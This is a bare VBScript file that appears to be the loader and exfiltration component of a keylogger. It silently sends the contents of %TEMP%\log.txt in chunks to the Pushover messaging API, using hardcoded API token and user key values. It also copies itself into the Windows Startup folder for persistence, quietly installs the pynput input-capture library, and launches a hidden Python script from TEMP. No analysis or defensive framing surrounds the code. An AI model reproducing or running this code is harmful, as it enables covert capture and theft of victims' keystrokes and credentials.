Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Define the TEMP folder path
tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
logFile = tempPath & "\log.txt"

' Create log.txt if it does not exist
If Not objFSO.FileExists(logFile) Then
    Set objFile = objFSO.CreateTextFile(logFile, True)
    objFile.WriteLine "Log file created on: " & Now
    objFile.Close
End If

' Define PowerShell script
psCommand = "powershell -ExecutionPolicy Bypass -NoProfile -Command " & _
    """$API_TOKEN='a4mbuegdv65j65d9buc4bzxezrsf4w'; " & _
    "$USER_KEY='u2m1rdameavmjmg6abkauqy6ejdqk7'; " & _
    "$FILE_PATH=[System.IO.Path]::Combine($env:TEMP,'log.txt'); " & _
    "if (-Not (Test-Path $FILE_PATH)) {exit}; " & _
    "$MESSAGE = Get-Content $FILE_PATH -Raw; $MAX_LENGTH = 1024; " & _
    "while ($MESSAGE.Length -gt 0) { " & _
    "$CHUNK = $MESSAGE.Substring(0, [Math]::Min($MAX_LENGTH, $MESSAGE.Length)); " & _
    "Invoke-RestMethod -Uri 'https://api.pushover.net:443/1/messages.json' " & _
    "-Method Post -Body @{token=$API_TOKEN; user=$USER_KEY; message=$CHUNK}; " & _
    "$MESSAGE = $MESSAGE.Substring($CHUNK.Length)}; exit"""

' Run the PowerShell command (silent mode)
objShell.Run "cmd /c " & psCommand, 0, True

' Copy itself to the Startup folder for persistence
startupPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\"
currentScript = WScript.ScriptFullName
objFSO.CopyFile currentScript, startupPath & "b.vbs", True

' Install pynput in the background
objShell.Run "cmd /c ""pip install pynput""", 0, True

' Define the path to the Python script in the TEMP directory
pythonScript = tempPath & "\a.py"

' Check if the Python script exists before running
If objFSO.FileExists(pythonScript) Then
    objShell.Run "cmd /c ""pythonw """ & pythonScript & """", 0, False
End If
